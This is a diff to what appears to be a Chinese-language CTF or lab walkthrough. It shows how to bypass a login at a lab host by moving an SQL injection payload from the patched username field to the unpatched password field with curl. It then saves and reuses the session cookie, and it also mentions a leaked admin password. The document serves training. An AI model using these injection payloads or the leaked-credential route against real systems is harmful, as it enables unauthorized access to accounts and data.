@@ -275,15 +275,16 @@ curl -i -X POST http://cairn.internal:8080/login --data "username=administrator'
 ```
 原因：這台之前收過一份 pentest finding（SEC-2211），修法是把 `username` 欄位的單引號跟 `--` 直接 strip 掉——`admin_panel.py` 裡 `username = username.replace("'", "").replace("--", "")`。這個修法只針對 finding 報告裡點名的欄位，同一條 f-string 組出來的查詢在 `password` 欄位完全沒有動過。玩家需要實際用 Burp Repeater（或手動改 curl）測試把 injection 換到 `password` 欄位，才會發現同一個弱點還在：
 ```bash
-curl -i -X POST http://cairn.internal:8080/login --data "username=administrator&password=x' OR '1'='1"
-# 302 -> /dashboard
+curl -i -c cairn_cookies.txt -X POST http://cairn.internal:8080/login --data "username=administrator&password=x' OR '1'='1"
+# 302 -> /dashboard，回應帶 Set-Cookie: cairn_session=<token>
 ```
 （原理：`SELECT * FROM admins WHERE username='administrator' AND password='x' OR '1'='1'`，`AND` 比 `OR` 先算，右邊的 `'1'='1'` 恆真，整個 WHERE 恆真，回傳第一筆。）
 
 也可以不用 SQLi，直接用 3.3 節洩漏的 `administrator / Records!Access99` 正常登入——**兩條路都通**，SQLi 不是唯一解，兩者互不影響。
 
+**`/dashboard`、`/records/*` 現在有真的 session 檢查**（`admin_panel.py` 的 `VALID_SESSIONS`/`has_valid_session`），沒帶登入時拿到的 `cairn_session` cookie 一律 302 回首頁——**一定要用 `-b` 帶上面 `-c` 存下來的 cookie**，不能像沒有這個檢查時那樣直接裸 curl：
 ```bash
-curl http://cairn.internal:8080/dashboard
+curl -b cairn_cookies.txt http://cairn.internal:8080/dashboard
 # 列出 [101]~[106] 六份文件
 ```
 | # | 標題 | 內容重點 |
